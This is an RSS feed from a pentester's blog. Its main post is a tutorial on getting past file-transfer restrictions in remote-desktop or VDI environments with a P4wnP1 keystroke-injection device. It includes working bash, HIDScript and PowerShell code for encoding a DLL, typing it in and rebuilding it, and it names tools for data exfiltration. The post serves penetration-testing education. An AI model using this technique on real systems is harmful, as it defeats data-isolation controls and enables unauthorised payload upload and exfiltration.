<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Offensive Security mindset]]></title><description><![CDATA[Pentester and wannabe Red Teamer]]></description><link>https://nokosi.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Tue, 20 Oct 2020 21:12:37 GMT</lastBuildDate><item><title><![CDATA[Breaking a remote host isolation]]></title><description><![CDATA[TLDR;
Using HID attacks to break remote host isolation. The purpose of this short article is to share a technique to bypass the file…]]></description><link>https://nokosi.github.io/Bypass-RAS-host-isolation/</link><guid isPermaLink="false">https://nokosi.github.io/Bypass-RAS-host-isolation/</guid><pubDate>Tue, 20 Oct 2020 07:26:03 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;TLDR;
Using HID attacks to break remote host isolation.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The purpose of this short article is to share a technique to bypass the file exchange restrictions that can be enforced on remote access environments. When implementing a remote environment (e.g. VDI [Virtual Desktop Infrastructure] or RDS [Remote Desktop Services] environments), it is possible to prevent file upload and download from the RAS [Remote Access Services] environment. The purpose being to ensure that the data is kept within the organization’s premises.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;From this starting point, I was looking for a technique to circumvent these restrictions to be able to upload arbitrary payloads on the target remote host and at a later stage, being able to exfiltrate files from the remote host.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;To achieve this goal, I enumerated all the input channels at my disposal to interact with the RAS environment from my nomad device. The most obvious input channels available are the keyboard and the mouse. As such, a HID attack seemed a good candidate to upload arbitrary content. HID attacks consist of plugging a device to a target host, which is programmed to inject specific keystrokes. For this purpose, I really enjoy using P4wnP1. The P4wnP1 A.L.O.A. project turns a Raspberry Pi [RPI] into an attacking machine able to carry out all sort of attacks including HID attacks. The tool is very optimized and allows to &lt;em&gt;type&lt;/em&gt; (i.e. inject keystrokes) at a lightning speed on a target host.&lt;/p&gt;
&lt;h2&gt;P4wnP1 as an accelerator&lt;/h2&gt;
&lt;h3&gt;Payload preparation&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;What is the link between a P4wnP1 and targeting an isolated remote access environment?&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Well, the idea here is to leverage the P4wnP1 to do the heavy lifting for us and literally &lt;em&gt;type&lt;/em&gt; our payload on the target RAS environment. As the P4wnP1 can only inject printable characters, we will need to adapt our payload.&lt;/p&gt;
&lt;p&gt;Let’s say, we would like to upload the file &lt;em&gt;someFile.dll&lt;/em&gt;. The following are steps to follow to prepare our payload. I tried several approaches to prepare the payloads, which were not successful. Most of issues were (i) typing errors leading to corrupted files and (ii) an eternity to type the payload.  Finally, I came up with the following sequence, which had the advantage of optimizing the typing speed free of typing errors:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ZIP compression of the payload;&lt;/li&gt;
&lt;li&gt;Base64 encoding of the archive; and&lt;/li&gt;
&lt;li&gt;Hexadecimal conversion of the file.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;On my Linux attacking machine, the aforementioned steps could be reproduced as follows:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;fi=&amp;quot;./someFile.dll&amp;quot;
fz=&amp;quot;$fi.zip&amp;quot;
fb=&amp;quot;$fz.b64&amp;quot;
fh=&amp;quot;$fb.hex&amp;quot;
ff=&amp;quot;$fh.txt&amp;quot;

zip &amp;quot;$fi&amp;quot; &amp;quot;$fz&amp;quot;

cat &amp;quot;$fz&amp;quot; | base64 -w 0 &amp;gt;&amp;gt; &amp;quot;$fb&amp;quot;

cat &amp;quot;$fb&amp;quot; | xxd -plain &amp;gt;&amp;gt; &amp;quot;$fh&amp;quot;

cat &amp;quot;$fh&amp;quot; | tr -d “\n” &amp;gt; &amp;quot;$ff&amp;quot;

echo &amp;quot;The final payload $ff (hash: $(sha256sum $ff)) based on the file $fi (hash: $(sha256sum $fi)) is ready to be used&amp;quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Preparation of the remote host&lt;/h3&gt;
&lt;p&gt;Once the payload is ready, the RAS environment needs to be prepared to foster the payload. I would advise using &lt;em&gt;Notepad.exe&lt;/em&gt; but any similar application will work. &lt;br /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;During the transfer, you will not be able to use the RAS environment. It is necessary that the receiving application (e.g. &lt;em&gt;Notepad.exe&lt;/em&gt;) keeps the focus during the transfer. Otherwise, parts of the payload would be missing leading to a corrupted file.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Last but not least, the RPI needs to be plugged to the nomad device via USB. Once the P4wnP1 is up and running, you can copy the payload (&lt;code class=&quot;language-text&quot;&gt;cat someFile.dll.zip.b64.hex.txt | xclip -sel clip&lt;/code&gt;) and connect to it using your preferred mean (e.g. direct Wi-Fi, or using directly the browser of the nomad device). Under the “HIDSCRIPT” tab, you can paste the following:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;layout(&amp;#39;us&amp;#39;)		// US Keyboard layout
typingSpeed(10,0) 	// Wait X ms between key strokes + additional random value between 0ms &amp;amp; Yms
delay(10)			// Xms delay
type(&amp;quot;&amp;lt;YourPayload&amp;gt;&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
&lt;blockquote&gt;
&lt;p&gt;The keyboard layout needs to match the one of the RAS environment. The numerical values can be adjusted as well if needed.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Launching the attack&lt;/h3&gt;
&lt;p&gt;At this point, everything is set and the “Run” button can be hit to instruct the P4wnP1 writing the payload. If everything is working fine, you will see the Notepad being filled of characters. Keep an eye on the Notepad to be aware when the transfer is completed. The Notepad content can be saved on the filesystem of the RAS environment. The last step is to apply the same operations in a reverse order to get the initial DLL file. PowerShell can be used for this purpose.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;PS&amp;gt; $temp = &amp;quot;&amp;quot;
PS&amp;gt; $rawfile = &amp;quot;.\transfer.txt&amp;quot; 	# transfer.txt holds the payload typed with the RPI
PS&amp;gt; $zipfile = &amp;quot;.\transfer.zip&amp;quot;
PS&amp;gt; $finalfile = &amp;quot;.\someDll.dll&amp;quot;

PS&amp;gt; $payload = Get-Content &amp;quot;$rawfile&amp;quot;

# Back to the Base64 payload
PS&amp;gt; ($payload -split &amp;quot;(\w{2})&amp;quot; ).Split(&amp;#39;&amp;#39;,[System.StringSplitOptions]::RemoveEmptyEntries) | forEach {$temp += [char]([convert]::toint16($_,16))}

# Back to the ZIP
PS&amp;gt; [IO.File]::WriteAllBytes($zipfile, [Convert]::FromBase64String($temp))

# Back to the initial DLL file
PS&amp;gt; Expand-Archive -LiteralPath $zipfile  -DestinationPath $finalfile

PS&amp;gt; &amp;quot;The payload $finalfile (hash: Get-FileHash -Algorithm SHA256 $finalfile) has been successfully retrieved from the file $rawfile (hash: $(Get-FileHash -Algorithm SHA256 $rawfile))&amp;quot;

PS&amp;gt; Clear-Variable -name temp,rawfile,zipfile,finalfile,payload&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;br/&gt;
Here we go ! If all the checksums match, the file transfer has been successful! From there, you can upload any file on the RAS environment.
&lt;h2&gt;Closing thoughts&lt;/h2&gt;
&lt;p&gt;To the best of my knowldege, I am not aware of a native way to prevent such attacks on Windows systems. Even though, the impact of exploiting this technique is pretty important, it requires a threat agent to have already access to a remote access environment.&lt;/p&gt;
&lt;p&gt;But, what about file exfiltration? With the upload capability, it is straight forward to upload tools to establish an exfiltration channel. The following are examples of tools that can be used to setup an exfiltration channel:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/earthquake/XFLTReaT&quot;&gt;XFLTReaT&lt;/a&gt;;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://rdp2tcp.sourceforge.net/&quot;&gt;rdp2tcp&lt;/a&gt;;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/&quot;&gt;PTP-RAT&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hope that you enjoyed this post!&lt;/p&gt;
&lt;br&gt;</content:encoded></item><item><title><![CDATA[~$whoami]]></title><description><![CDATA[About me Offensive security enthusiast, pentester during the day and wannabe Red Teamer during the night. Always keen on learning new things…]]></description><link>https://nokosi.github.io/whoami/</link><guid isPermaLink="false">https://nokosi.github.io/whoami/</guid><pubDate>Mon, 19 Oct 2020 20:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;About me&lt;/h1&gt;
&lt;p&gt;Offensive security enthusiast, pentester during the day and wannabe Red Teamer during the night. Always keen on learning new things and digging deeper subjects. Thoughts are mine.&lt;/p&gt;</content:encoded></item></channel></rss>